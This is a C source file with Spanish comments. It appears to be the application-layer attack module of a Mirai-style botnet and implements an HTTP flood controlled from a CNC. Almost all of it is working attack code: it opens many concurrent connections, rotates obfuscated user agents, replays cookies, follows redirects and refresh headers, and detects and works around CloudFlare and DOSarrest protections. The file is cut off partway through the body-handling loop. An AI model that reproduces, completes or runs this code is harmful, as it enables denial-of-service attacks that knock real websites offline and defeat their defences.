/***************************************************************************
 * Archivo: attack_app.c
 * 
 * Descripción: Implementación de ataques de aplicación específicos para el bot
 * incluyendo ataques HTTP y proxy. Este módulo maneja las conexiones HTTP
 * persistentes, el manejo de cookies, redirecciones y bypass de protecciones.
 * 
 * Funcionalidades principales:
 * - Ataque HTTP flooding con múltiples hilos
 * - Manejo de cookies y sesiones
 * - Bypass de protecciones (CloudFlare, DDoSArrest)
 * - Transferencias chunked
 * - Keep-alive y reconexiones
 ***************************************************************************/

/* Habilitar extensiones GNU */
#define _GNU_SOURCE

/* Cabeceras del sistema */
#ifdef DEBUG
#include <stdio.h>      /* E/S estándar (solo en modo debug) 
                         * printf() - Mensajes de depuración
                         * sprintf() - Formateo de strings */
#endif
#include <stdlib.h>     /* Funciones estándar
                         * malloc/free - Gestión de memoria
                         * rand/srand - Números aleatorios */
#include <unistd.h>     /* Llamadas POSIX
                         * close() - Cerrar descriptores
                         * sleep() - Pausas */
#include <sys/socket.h> /* API de sockets
                         * socket() - Crear sockets
                         * connect() - Iniciar conexiones
                         * send/recv - Transferencia de datos */
#include <sys/select.h> /* select() y fd_set
                         * select() - Multiplexación de E/S
                         * FD_SET/CLR - Manipular conjuntos */
#include <errno.h>      /* Códigos de error
                         * errno - Último error
                         * EAGAIN/EWOULDBLOCK - No bloqueante */
#include <string.h>     /* Manejo de strings
                         * memcpy/memmove - Copiar memoria
                         * strlen/strcpy - Manipular strings */
#include <fcntl.h>      /* Control de archivos 
                         * fcntl() - Configurar descriptores
                         * O_NONBLOCK - Modo no bloqueante */

/* Cabeceras locales */
#include "includes.h"   /* Definiciones comunes
                         * Constantes y macros globales
                         * Tipos de datos compartidos */
#include "attack.h"     /* Estructuras de ataque
                         * attack_target - Objetivos
                         * attack_option - Opciones
                         * attack_method - Métodos */
#include "rand.h"       /* Generación de números aleatorios
                         * rand_next() - PRNG personalizado
                         * rand_str() - Strings aleatorios */
#include "table.h"      /* Tabla de strings cifrados
                         * Almacena cadenas ofuscadas
                         * Funciones de cifrado/descifrado */
#include "util.h"       /* Funciones de utilidad
                         * util_strlen() - Longitud segura
                         * util_strcpy() - Copia segura
                         * util_zero() - Borrado seguro */

/**
 * Función de Ataque Proxy
 * 
 * Implementa ataque a través de proxies (placeholder para futura implementación)
 * 
 * @param targs_len  Número de objetivos
 * @param targs      Array de objetivos
 * @param opts_len   Número de opciones
 * @param opts       Array de opciones de ataque
 */
void attack_app_proxy(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    /* Placeholder para futura implementación */
}

/**
 * Función de Ataque HTTP
 * 
 * Implementa un ataque de inundación HTTP con las siguientes características:
 * - Múltiples conexiones simultáneas
 * - Manejo de cookies y sesiones
 * - Seguimiento de redirecciones
 * - Bypass de protecciones anti-DDoS
 * - Keep-alive y reconexiones automáticas
 * 
 * @param targs_len  Número de objetivos
 * @param targs      Array de objetivos
 * @param opts_len   Número de opciones
 * @param opts       Array de opciones de ataque
 */
void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    /* Variables de control y estado */
    int i, ii, rfd, ret = 0;                   /* Contadores e indicadores */
    struct attack_http_state *http_table = NULL; /* Tabla de estados de conexión */
    
    /* Obtener opciones del ataque */
    char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL); /* Datos POST */
    char *method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "GET");     /* Método HTTP */
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);      /* Dominio objetivo */
    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");           /* Ruta del recurso */
    int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);          /* Número de conexiones */
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);        /* Puerto destino */

    /* Buffer para datos genéricos */
    char generic_memes[10241] = {0};

    /* Validación de parámetros obligatorios */
    if (domain == NULL || path == NULL)
        return;  /* Dominio y ruta son requeridos */

    /* Validación de longitud de ruta */
    if (util_strlen(path) > HTTP_PATH_MAX - 1)
        return;  /* Ruta demasiado larga */

    /* Validación de longitud de dominio */
    if (util_strlen(domain) > HTTP_DOMAIN_MAX - 1)
        return;  /* Dominio demasiado largo */

    /* Validación de longitud del método HTTP */
    if (util_strlen(method) > 9)
        return;  /* Método HTTP no válido */

    /* Conversión del método HTTP a mayúsculas
     * Nota: Solo convertimos si no es un string de solo lectura
     * - Si method es el valor por defecto ("GET"), es read-only y no se modifica
     * - Si viene del CNC, es writable y se puede convertir sin problemas
     */
    for (ii = 0; ii < util_strlen(method); ii++)
        if (method[ii] >= 'a' && method[ii] <= 'z')
            method[ii] -= 32;  /* Convertir a mayúsculas */

    /* Limitar número de conexiones al máximo permitido */
    if (sockets > HTTP_CONNECTION_MAX)
        sockets = HTTP_CONNECTION_MAX;

    /* Desbloquear strings frecuentemente utilizados de la tabla cifrada
     * Estos strings se usan para:
     * - Manejo de cookies y sesiones
     * - Headers HTTP comunes
     * - Detección de protecciones anti-DDoS
     */
    table_unlock_val(TABLE_ATK_SET_COOKIE);          /* Cookie setter */
    table_unlock_val(TABLE_ATK_REFRESH_HDR);         /* Header de refresh */
    table_unlock_val(TABLE_ATK_LOCATION_HDR);        /* Header de redirección */
    table_unlock_val(TABLE_ATK_SET_COOKIE_HDR);      /* Header Set-Cookie */
    table_unlock_val(TABLE_ATK_CONTENT_LENGTH_HDR);  /* Content-Length */
    table_unlock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);/* Transfer-Encoding */
    table_unlock_val(TABLE_ATK_CHUNKED);             /* Chunked encoding */
    table_unlock_val(TABLE_ATK_KEEP_ALIVE_HDR);      /* Keep-Alive */
    table_unlock_val(TABLE_ATK_CONNECTION_HDR);      /* Connection */
    table_unlock_val(TABLE_ATK_DOSARREST);           /* DDoS protection */
    table_unlock_val(TABLE_ATK_CLOUDFLARE_NGINX);    /* CloudFlare */

    /* Asignar memoria para la tabla de estados de conexiones */
    http_table = calloc(sockets, sizeof(struct attack_http_state));

    /* Inicializar cada conexión en la tabla de estados */
    for (i = 0; i < sockets; i++)
    {
        /* Inicializar estado básico */
        http_table[i].state = HTTP_CONN_INIT;   /* Estado inicial */
        http_table[i].fd = -1;                  /* Socket no creado */
        http_table[i].dst_addr = targs[i % targs_len].addr;  /* IP destino */

        /* Configurar ruta del recurso */
        util_strcpy(http_table[i].path, path);

        /* Asegurar que la ruta comience con '/' */
        if (http_table[i].path[0] != '/')
        {
            /* Mover el contenido actual un caracter a la derecha */
            memmove(http_table[i].path + 1, http_table[i].path, util_strlen(http_table[i].path));
            http_table[i].path[0] = '/';  /* Agregar '/' al inicio */
        }

        /* Configurar método HTTP */
        util_strcpy(http_table[i].orig_method, method);  /* Guardar método original */
        util_strcpy(http_table[i].method, method);       /* Método actual */

        /* Configurar dominio objetivo */
        util_strcpy(http_table[i].domain, domain);

        if (targs[i % targs_len].netmask < 32)
            http_table[i].dst_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));

        switch(rand_next() % 5)
        {
            case 0:
                table_unlock_val(TABLE_HTTP_ONE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
                table_lock_val(TABLE_HTTP_ONE);
                break;
            case 1:
                table_unlock_val(TABLE_HTTP_TWO);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
                table_lock_val(TABLE_HTTP_TWO);
                break;
            case 2:
                table_unlock_val(TABLE_HTTP_THREE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
                table_lock_val(TABLE_HTTP_THREE);
                break;
            case 3:
                table_unlock_val(TABLE_HTTP_FOUR);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
                table_lock_val(TABLE_HTTP_FOUR);
                break;
            case 4:
                table_unlock_val(TABLE_HTTP_FIVE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
                table_lock_val(TABLE_HTTP_FIVE);
                break;
        }

        util_strcpy(http_table[i].path, path);
    }

    /* Bucle principal del ataque
     * Este bucle maneja:
     * 1. Monitoreo de múltiples conexiones con select()
     * 2. Estados de cada conexión
     * 3. Timeouts y reconexiones
     * 4. Envío y recepción de datos HTTP
     */
    while(TRUE)
    {
        /* Variables para select() */
        fd_set fdset_rd, fdset_wr;           /* Conjuntos de descriptores */
        int mfd = 0;                         /* Máximo descriptor + 1 */
        int nfds;                            /* Número de descriptores listos */
        struct timeval tim;                  /* Timeout para select */
        struct attack_http_state *conn;      /* Estado de conexión actual */
        uint32_t fake_time = time(NULL);     /* Tiempo actual para timeouts */

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->state == HTTP_CONN_RESTART)
            {
                if (conn->keepalive)
                    conn->state = HTTP_CONN_SEND;
                else
                    conn->state = HTTP_CONN_INIT;
            }

            if (conn->state == HTTP_CONN_INIT)
            {
                struct sockaddr_in addr = {0};

                if (conn->fd != -1)
                    close(conn->fd);
                if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    continue;

                fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

                ii = 65535;
                setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));

                addr.sin_family = AF_INET;
                addr.sin_addr.s_addr = conn->dst_addr;
                addr.sin_port = htons(dport);

                conn->last_recv = fake_time;
                conn->state = HTTP_CONN_CONNECTING;
                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
#ifdef DEBUG
                printf("[http flood] fd%d started connect\n", conn->fd);
#endif

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CONNECTING)
            {
                if (fake_time - conn->last_recv > 30)
                {
                    conn->state = HTTP_CONN_INIT;
                    close(conn->fd);
                    conn->fd = -1;
                    continue;
                }

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SEND)
            {
                conn->content_length = -1; 
                conn->protection_type = 0;
                util_zero(conn->rdbuf, HTTP_RDBUF_SIZE);
                conn->rdbuf_pos = 0;

#ifdef DEBUG
                //printf("[http flood] Sending http request\n");
#endif

                char buf[10240];
                util_zero(buf, 10240);

                util_strcpy(buf + util_strlen(buf), conn->method);
                util_strcpy(buf + util_strlen(buf), " ");
                util_strcpy(buf + util_strlen(buf), conn->path);
                util_strcpy(buf + util_strlen(buf), " HTTP/1.1\r\nUser-Agent: ");
                util_strcpy(buf + util_strlen(buf), conn->user_agent);
                util_strcpy(buf + util_strlen(buf), "\r\nHost: ");
                util_strcpy(buf + util_strlen(buf), conn->domain);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_KEEP_ALIVE, NULL));
                table_lock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT, NULL));
                table_lock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT_LNG, NULL));
                table_lock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                if (postdata != NULL)
                {
                    table_unlock_val(TABLE_ATK_CONTENT_TYPE);
                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE, NULL));
                    table_lock_val(TABLE_ATK_CONTENT_TYPE);

                    util_strcpy(buf + util_strlen(buf), "\r\n");
                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
                    util_strcpy(buf + util_strlen(buf), " ");
                    util_itoa(util_strlen(postdata), 10, buf + util_strlen(buf));
                    util_strcpy(buf + util_strlen(buf), "\r\n");
                }

                if (conn->num_cookies > 0)
                {
                    util_strcpy(buf + util_strlen(buf), "Cookie: ");
                    for (ii = 0; ii < conn->num_cookies; ii++)
                    {
                        util_strcpy(buf + util_strlen(buf), conn->cookies[ii]);
                        util_strcpy(buf + util_strlen(buf), "; ");
                    }
                    util_strcpy(buf + util_strlen(buf), "\r\n");
                }

                util_strcpy(buf + util_strlen(buf), "\r\n");

                if (postdata != NULL)
                    util_strcpy(buf + util_strlen(buf), postdata);

                if (!util_strcmp(conn->method, conn->orig_method))
                    util_strcpy(conn->method, conn->orig_method);

#ifdef DEBUG
                if (sockets == 1)
                {
                    printf("sending buf: \"%s\"\n", buf);
                }
#endif

                send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
                conn->last_send = fake_time;

                conn->state = HTTP_CONN_RECV_HEADER;
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_RECV_HEADER)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_RECV_BODY)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_QUEUE_RESTART)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CLOSED)
            {
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
            else
            {
                // NEW STATE WHO DIS
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
        }

        if (mfd == 0)
            continue;

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(mfd, &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        if (nfds < 1)
            continue;

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
#ifdef DEBUG
                    printf("[http flood] FD%d connected.\n", conn->fd);
#endif
                        conn->state = HTTP_CONN_SEND;
                }
                else
                {
#ifdef DEBUG
                    printf("[http flood] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = HTTP_CONN_INIT;
                    continue;
                }
            }

        if (FD_ISSET(conn->fd, &fdset_rd))
            {
                if (conn->state == HTTP_CONN_RECV_HEADER)
                {
                    int processed = 0;

                    util_zero(generic_memes, 10240);
                    if ((ret = recv(conn->fd, generic_memes, 10240, MSG_NOSIGNAL | MSG_PEEK)) < 1)
                    {
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = HTTP_CONN_INIT;
                        continue;
                    }


                    // we want to process a full http header (^:
                    if (util_memsearch(generic_memes, ret, "\r\n\r\n", 4) == -1 && ret < 10240)
                        continue;

                    generic_memes[util_memsearch(generic_memes, ret, "\r\n\r\n", 4)] = 0;

#ifdef DEBUG
                    if (sockets == 1)
                        printf("[http flood] headers: \"%s\"\n", generic_memes);
#endif

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CLOUDFLARE_NGINX, NULL)) != -1)
                        conn->protection_type = HTTP_PROT_CLOUDFLARE;

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_DOSARREST, NULL)) != -1)
                        conn->protection_type = HTTP_PROT_DOSARREST;

                    conn->keepalive = 0;
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *con_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            if (util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_KEEP_ALIVE_HDR, NULL)))
                                conn->keepalive = 1;
                        }
                    }

                    conn->chunked = 0;
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *con_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            if (util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_CHUNKED, NULL)))
                                conn->chunked = 1;
                        }
                    }

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *len_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            conn->content_length = util_atoi(len_ptr, 10);
                        }
                    } else {
                        conn->content_length = 0;
                    }

                    processed = 0;
                    while (util_stristr(generic_memes + processed, ret, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, NULL)) != -1 && conn->num_cookies < HTTP_COOKIE_MAX)
                    {
                        int offset = util_stristr(generic_memes + processed, ret, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, NULL));
                        if (generic_memes[processed + offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *cookie_ptr = &(generic_memes[processed + offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;

                            if (util_memsearch(generic_memes + processed + offset, ret - processed - offset, ";", 1) > 0)
                                nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, ";", 1) - 1;

                            generic_memes[processed + offset + nl_off] = 0;

                            for (ii = 0; ii < util_strlen(cookie_ptr); ii++)
                                if (cookie_ptr[ii] == '=')
                                    break;

                            if (cookie_ptr[ii] == '=')
                            {
                                int equal_off = ii, cookie_exists = FALSE;

                                for (ii = 0; ii < conn->num_cookies; ii++)
                                    if (util_strncmp(cookie_ptr, conn->cookies[ii], equal_off))
                                    {
                                        cookie_exists = TRUE;
                                        break;
                                    }

                                if (!cookie_exists)
                                {
                                    if (util_strlen(cookie_ptr) < HTTP_COOKIE_LEN_MAX)
                                    {
                                        util_strcpy(conn->cookies[conn->num_cookies], cookie_ptr);
                                        conn->num_cookies++;
                                    }
                                }
                            }
                        }

                        processed += offset;
                    }

                    // this will still work as previous handlers will only add in null chars or similar
                    // and we specify the size of the string to stristr
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_LOCATION_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_LOCATION_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *loc_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            //increment it one so that it is length of the string excluding null char instead of 0-based offset
                            nl_off++;

                            if (util_memsearch(loc_ptr, nl_off, "http", 4) == 4)
                            {
                                //this is an absolute url, domain name change maybe?
                                ii = 7;
                                //http(s)
                                if (loc_ptr[4] == 's')
                                    ii++;

                                memmove(loc_ptr, loc_ptr + ii, nl_off - ii);
                                ii = 0;
                                /* Separar dominio de la ruta
                                 * - Buscar el primer '/' que separa dominio/ruta
                                 * - Terminar string en el separador
                                 */
                                while (loc_ptr[ii] != 0)
                                {
                                    if (loc_ptr[ii] == '/')
                                    {
                                        loc_ptr[ii] = 0;  /* Marca fin del dominio */
                                        break;
                                    }
                                    ii++;
                                }

                                /* En este punto tenemos:
                                 * - domain: loc_ptr (hasta el primer /)
                                 * - path: &(loc_ptr[ii + 1]) (después del /)
                                 */

                                /* Actualizar dominio si es válido
                                 * - Verificar que no esté vacío
                                 * - No exceder tamaño máximo
                                 */
                                if (util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX)
                                    util_strcpy(conn->domain, loc_ptr);

                                /* Actualizar ruta si es válida
                                 * - Limpiar buffer anterior
                                 * - Copiar nueva ruta si existe
                                 * - Mantener el '/' inicial
                                 */
                                if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                {
                                    util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                    if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                        util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                }
                            }
                            else if (loc_ptr[0] == '/')
                            {
                                //handle relative url
                                util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                if (util_strlen(&(loc_ptr[ii + 1])) > 0 && util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                            }

                            conn->state = HTTP_CONN_RESTART;
                            continue;
                        }
                    }

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_REFRESH_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_REFRESH_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *loc_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            //increment it one so that it is length of the string excluding null char instead of 0-based offset
                            nl_off++;

                            ii = 0;

                            while (loc_ptr[ii] != 0 && loc_ptr[ii] >= '0' && loc_ptr[ii] <= '9')
                                ii++;

                            if (loc_ptr[ii] != 0)
                            {
                                int wait_time = 0;
                                loc_ptr[ii] = 0;
                                ii++;

                                if (loc_ptr[ii] == ' ')
                                    ii++;

                                if (util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), "url=") != -1)
                                    ii += util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), "url=");

                                if (loc_ptr[ii] == '"')
                                {
                                    ii++;

                                    //yes its ugly, but i dont care
                                    if ((&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] == '"')
                                        (&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] = 0;
                                }

                                wait_time = util_atoi(loc_ptr, 10);

                                //YOLO LOL
                                while (wait_time > 0 && wait_time < 10 && fake_time + wait_time > time(NULL))
                                    sleep(1);

                                loc_ptr = &(loc_ptr[ii]);


                                if (util_stristr(loc_ptr, util_strlen(loc_ptr), "http") == 4)
                                {
                                    //this is an absolute url, domain name change maybe?
                                    ii = 7;
                                    //http(s)
                                    if (loc_ptr[4] == 's')
                                        ii++;

                                    memmove(loc_ptr, loc_ptr + ii, nl_off - ii);
                                    ii = 0;
                                    while (loc_ptr[ii] != 0)
                                    {
                                        if (loc_ptr[ii] == '/')
                                        {
                                            loc_ptr[ii] = 0;
                                            break;
                                        }
                                        ii++;
                                    }

                                    // domain: loc_ptr;
                                    // path: &(loc_ptr[ii + 1]);

                                    if (util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX)
                                        util_strcpy(conn->domain, loc_ptr);

                                    if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    {
                                        util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                        if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                            util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                    }
                                }
                                else if (loc_ptr[0] == '/')
                                {
                                    //handle relative url
                                    if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    {
                                        util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                        if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                            util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                    }
                                }

                                strcpy(conn->method, "GET");
                                // queue the state up for the next time
                                conn->state = HTTP_CONN_QUEUE_RESTART;
                                continue;
                            }
                        }
                    }

                    // actually pull the content from the buffer that we processed via MSG_PEEK
                    processed = util_memsearch(generic_memes, ret, "\r\n\r\n", 4);

                    if (util_strcmp(conn->method, "POST") || util_strcmp(conn->method, "GET"))
                        conn->state = HTTP_CONN_RECV_BODY;
                    else if (ret > processed)
                        conn->state = HTTP_CONN_QUEUE_RESTART;
                    else
                        conn->state = HTTP_CONN_RESTART;

                    ret = recv(conn->fd, generic_memes, processed, MSG_NOSIGNAL);
                } else if (conn->state == HTTP_CONN_RECV_BODY) {
                    /* Procesar recepción del cuerpo HTTP
                     * Este bloque maneja:
                     * - Recepción del body HTTP chunk por chunk
                     * - Manejo del buffer circular para datos grandes
                     * - Detección de cierre de conexión
                     * - Control de errores de red
                     */
                    while (TRUE)
                    {
                        /* Verificar si el estado cambió mientras procesábamos */
                        if (conn->state != HTTP_CONN_RECV_BODY)
                        {
                            break;
                        }

                        /* Si el buffer está lleno, hacer espacio moviendo datos */
                        if (conn->rdbuf_pos == HTTP_RDBUF_SIZE)
                        {
                            /* Mover datos al inicio del buffer dejando espacio libre
                             * - Implementa un buffer circular para optimizar memoria
                             * - Evita tener que redimensionar o perder datos
                             */
                            memmove(conn->rdbuf, conn->rdbuf + HTTP_HACK_DRAIN, HTTP_RDBUF_SIZE - HTTP_HACK_DRAIN);
                            conn->rdbuf_pos -= HTTP_HACK_DRAIN;
                        }
                        
                        /* Recibir más datos del socket
                         * - errno se limpia para detectar errores
                         * - MSG_NOSIGNAL evita señales SIGPIPE
                         */
                        errno = 0;
                        ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, HTTP_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                        
                        /* Manejar cierre graceful de la conexión (ret == 0)
                         * - El peer cerró la conexión limpiamente
                         * - Se marca como error para cerrar nuestra conexión
                         */
                        if (ret == 0)
                        {
#ifdef DEBUG
                            printf("[http flood] FD%d connection gracefully closed\n", conn->fd);
#endif
                            errno = ECONNRESET;
                            ret = -1; // Fall through to closing connection below
                        }
                        
                        /* Manejar errores de red */
                        if (ret == -1)
                        {
                            /* Solo reiniciar si es error real (no EAGAIN/EWOULDBLOCK) */
                            if (errno != EAGAIN && errno != EWOULDBLOCK)
                            {
#ifdef DEBUG
                                printf("[http flood] FD%d lost connection\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = HTTP_CONN_INIT;
                            }
                            break;
                        }

                        conn->rdbuf_pos += ret;
                        conn->last_recv = fake_time;

                        while (TRUE)
                        {
                            int consumed = 0;

                            if (conn->content_length > 0)
                            {

                                consumed = conn->content_length > conn->rdbuf_pos ? conn->rdbuf_pos : conn->content_length;
                                conn->content_length -= consumed;

                                if (conn->protection_type == HTTP_PROT_DOSARREST)
                                {
                                    // we specifically want this to be case sensitive
                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11) != -1)
                                    {
                                        int start_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11);
                                        int end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, "'", 1);
                                        conn->rdbuf[start_pos + (end_pos - 1)] = 0;

                                        if (conn->num_cookies < HTTP_COOKIE_MAX && util_strlen(&(conn->rdbuf[start_pos])) < HTTP_COOKIE_LEN_MAX)
                                        {
                                            util_strcpy(conn->cookies[conn->num_cookies], &(conn->rdbuf[start_pos]));
                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), "=");

                                            start_pos += end_pos + 3;
                                            end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, "'", 1);
                                            conn->rdbuf[start_pos + (end_pos - 1)] = 0;

                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), &(conn->rdbuf[start_pos]));
                                            conn->num_cookies++;
                                        }

                                        conn->content_length = -1;
